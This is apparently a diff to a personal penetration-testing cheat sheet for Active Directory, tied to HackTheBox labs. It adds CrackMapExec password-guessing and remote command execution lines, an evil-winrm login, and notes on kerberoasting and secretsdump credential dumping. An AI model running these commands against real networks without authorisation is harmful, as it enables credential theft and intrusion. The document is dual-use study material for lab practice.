@@ -1,5 +1,14 @@
 # Tools
 
+## Crackmapexec
+
+```bash
+crackmapexec smb <IP> -u <username(s)> -p <password(s)>
+
+crackmapexec winrm <IP> -u <username(s)> -p <password(s)>
+crackmapexec winrm <IP> -u <username(s)> -p <password(s)> -X "whoami"  # Run a command
+```
+
 ## Kerbrute
 
 Identify potential valid users
@@ -13,6 +22,8 @@ kerbrute userenum --dc <IP> -d <domain.local> users.txt
 ## Impacket
 
 #### GetADUsers
+
+Queries target domain for users data
 
 ```bash
 GetADUsers.py -all -dc-ip <IP> active.htb/svc_tgs   # Will need account creds
@@ -38,6 +49,8 @@ crackmapexec smb <IP> -u <user> -p <password> --shares  # Check for SMB shares t
 
 #### GetUserSPNs
 
+Queries target domain for SPNs that are running under a user account
+
 ```bash
 GetUserSPNs.py -request -dc-ip <IP> active.htb/svc_tgs
 # Check for kerberoasted output
@@ -45,6 +58,8 @@ GetUserSPNs.py -request -dc-ip <IP> active.htb/svc_tgs
 ```
 
 #### secretsdump
+
+Performs various techniques to dump secrets from the remote machine without executing any agent there.
 
 ```bash
 secretsdump.py htb.local/<username>@<IP>
@@ -78,6 +93,12 @@ Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}  # Get Kerberoastable u
 ```
 
 ## evil-winrm
+
+#### Connection
+
+```bash
+evil-winrm -u <user> -p <password> -i <IP>
+```
 
 #### Upload File to Target
 
